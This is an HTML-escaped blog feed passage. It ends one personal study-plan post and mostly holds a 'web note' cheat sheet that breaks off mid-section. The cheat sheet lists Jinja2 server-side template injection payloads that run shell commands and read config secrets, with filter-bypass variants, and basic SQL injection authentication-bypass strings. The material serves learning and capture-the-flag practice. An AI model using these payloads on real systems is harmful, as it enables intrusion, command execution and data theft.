    &lt;li&gt;&lt;del&gt;Purchase another laptop (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DELL XPS 15 12th generation Intel CPU&lt;/code&gt;)&lt;/del&gt;&lt;/li&gt;
    &lt;li&gt;BoB (Best of the Best) 11th? 12th?&lt;/li&gt;
    &lt;li&gt;Try to be the BEST without &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;competitive mind&lt;/code&gt;, Just &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;enjoy&lt;/code&gt;&lt;/li&gt;
  &lt;/ul&gt;
&lt;/blockquote&gt;</content><author><name>Ainsetin</name></author><category term="etc" /><summary type="html">This is my plan to be finished until/after graduating. Research Â§ must be finished until new yearâ€™s day Â§ Kernel : Dirty Cow Analysis (CVE-2016-5195) -processing Browser V8 : Study/Build V8 frequently and get shell from V8 Engine -Complete Develop Â§ new year STUDY plan Â§ Making interpreter/compiler with Rust -in progress :D (With Chris Ohk, ..) Goal Try something â€œnewâ€, Try Everything Pass any awesome Univ.â€™s admission (Complete) Pass drive license (Complete) Dreamhack Wargame 1st Format Sniper (Learn &amp;amp; Analyze about FSB) Dreamcurl (Rev O, Crypto X. So learn mathematics!) Unibitmap (Solved :D) dreamboard v2 (V8 : Solved :D) Purchase another laptop (DELL XPS 15 12th generation Intel CPU) BoB (Best of the Best) 11th? 12th? Try to be the BEST without competitive mind, Just enjoy</summary></entry><entry><title type="html">web note (update 2021.10.27)</title><link href="https://ainset.in//web-note-update.html" rel="alternate" type="text/html" title="web note (update 2021.10.27)" /><published>2021-10-27T10:00:00+09:00</published><updated>2021-10-27T10:00:00+09:00</updated><id>https://ainset.in//web-note-update</id><content type="html" xml:base="https://ainset.in//web-note-update.html">&lt;p&gt;&lt;em&gt;post will be frequently updated&lt;/em&gt;&lt;/p&gt;

&lt;h2 id=&quot;ssti-server-side-template-injection&quot;&gt;SSTI (Server Side Template Injection)&lt;/h2&gt;
&lt;p&gt;í•´ë‹¹ ì·¨ì•½ì ì€ ì›¹ í”„ë ˆì„ì›Œí¬ì—ì„œ ì‚¬ìš©ë˜ëŠ” ì—¬ëŸ¬ ê°€ì§€ Template Engineì—ì„œ ë°œìƒí•˜ë©°, íŠ¹ë³„í•œ êµ¬ë¬¸ì„ í†µí•´ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RCE&lt;/code&gt;ë¥¼ ì¼ìœ¼í‚¬ ìˆ˜ë„ ìˆë‹¤.&lt;br /&gt;
This vulnerability occurs in various Template Engines used in web frameworks, RCE and can also be triggered through special syntax.&lt;/p&gt;

&lt;p&gt;â–¶ jinja2&lt;/p&gt;
&lt;div class=&quot;language-py highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;# ê¸°ë³¸
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{{&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}}&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# check with config
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{{&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;config&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{{&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;config&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;items&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{{&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;config&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'secret_key'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}}&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# RCE with config
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{{&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;config&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__class__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__init__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__globals__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'os'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;popen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;ls&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{{&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;config&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;attr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;__class__&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__init__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__globals__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'os'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;popen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'cat flag'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}}&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# etc ('',(),get_flashed_messages, url_for, ...)
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{{&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__class__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__mro__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__subclasses__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;index&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;](&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'cat flag'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shell&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stdout&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;communicate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{{&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;get_flashed_messages&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__globals__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__builtins__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/flag&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{{&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;url_for&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__globals__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__builtins__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;eval&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'__import__(&quot;os&quot;).popen(&quot;ls -al&quot;).read()'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-py highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;# with request - í•„í„°ë§ì´ ë§¤ìš° ë§ì„ ê²½ìš° more query + requestë¥¼ í™œìš©í•˜ì—¬ ìš°íšŒ
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;http&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;//&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;foo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bar&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{{&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;attr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'class'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;attr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'mro'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;attr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'getitem'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}}&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__class__&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mro&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__mro__&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;getitem&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__getitem__&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;attr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'application'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;attr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'__globals__'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;attr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'__getitem__'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'__builtins__'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;attr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'__getitem__'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'__import__'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'os'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;attr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'popen'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'id'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;attr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'read'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)()}}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;sqli-sql-injection&quot;&gt;SQLI (sql injection)&lt;/h2&gt;
&lt;p&gt;í•´ë‹¹ ì·¨ì•½ì ì€ DBë¥¼ ê´€ë¦¬í•˜ëŠ” ì‘ìš© í”„ë¡œê·¸ë¨ì—ì„œ SQL ì¿¼ë¦¬ë¥¼ ì „ë‹¬í•  ë•Œ ì˜ë„í•˜ì§€ ì•Šì€ êµ¬ë¬¸ì„ ì „ë‹¬í•  ìˆ˜ ìˆë„ë¡ ë³€ì¡°ì‹œí‚¤ëŠ” ë° ëª©ì ì´ ìˆë‹¤.&lt;br /&gt;
The vulnerability is aimed at modulating the DB management application to deliver unintended phrases when delivering SQL queries.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;1. Comment symbol&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/* ~ */&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-- ~&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;#&lt;/code&gt; (URL encoded : &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%23&lt;/code&gt;)&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;-- example.&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;Select&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tbl&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;where&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'(user_input)'&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;-- Select ALL query from tbl&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;user_input&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;&quot;' or 1=1-- &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;Select&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tbl&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;where&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;or&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;--'&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;user_input&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;&quot;' or 1=1#&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;Select&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tbl&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;where&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;or&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;#&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;user_input&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;&quot;' or 1=1/*1234*/&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;Select&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tbl&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;where&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;or&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;cm&quot;&gt;/*1234*/&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;' ...?
(must have closed symbol)
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;2. with single quarter&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;idê°€ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;''&lt;/code&gt;ë¡œ ê°ì‹¸ì ¸ ìˆì„ ê²½ìš° &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;'&lt;/code&gt;ë¥¼ inputìœ¼ë¡œ ë„£ì–´ ë¨¼ì € ë‹«ì•„ì£¼ê²Œë” í•œ ë’¤ ì¡°ê±´ë¬¸ì„ ì´ì–´ì¤€ë‹¤.&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;-- example.&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;Select&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tbl&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;where&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'(user_input)'&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;-- Select ALL query from tbl&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;user_input&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;&quot;' or 1='1&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;Select&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tbl&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;where&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;or&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'1'&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;3. and, or, &amp;amp;&amp;amp;, ||, in, between, like&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;-- and, or&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;Select&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tbl&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;where&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'1234'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pw&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'5678'&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;Select&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tbl&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;where&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'1234'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;or&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pw&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'5678'&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;-- &amp;amp;&amp;amp;, || (no space required)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;Select&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tbl&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;where&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'1234'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pw&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'5678'&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;Select&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tbl&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;where&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'1234'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pw&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'5678'&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;-- in&lt;/span&gt;
